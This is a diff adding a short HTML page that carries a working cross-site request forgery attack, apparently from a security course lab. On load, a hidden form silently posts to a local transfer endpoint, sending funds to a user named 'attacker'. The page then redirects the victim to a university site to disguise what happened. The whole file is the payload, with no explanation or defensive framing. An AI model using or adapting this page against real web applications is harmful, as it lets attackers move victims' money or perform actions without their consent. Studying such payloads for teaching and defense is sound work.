@@ -1,0 +1,26 @@
+<html>
+    <body>
+        <form id="csrf" action="http://localhost:3000/post_transfer" method="POST">
+            <input type="hidden" name="destination_username" value="attacker" />
+            <input type="hidden" name="quantity" value="1" />
+        </form>
+        <script>
+            window.onload = function() {
+                
+                const promise1 = new Promise ((resolve, reject) => {
+                    document.getElementById('csrf').submit();
+                    resolve();
+                });
+                promise1.then((value) => {
+                    setTimeout(() => {
+                        // alert("chicken")
+                        document.location.replace("http://eecs.utk.edu/")
+                        
+                    }, 100);
+                })
+
+
+            }
+        </script>
+    </body>
+</html>
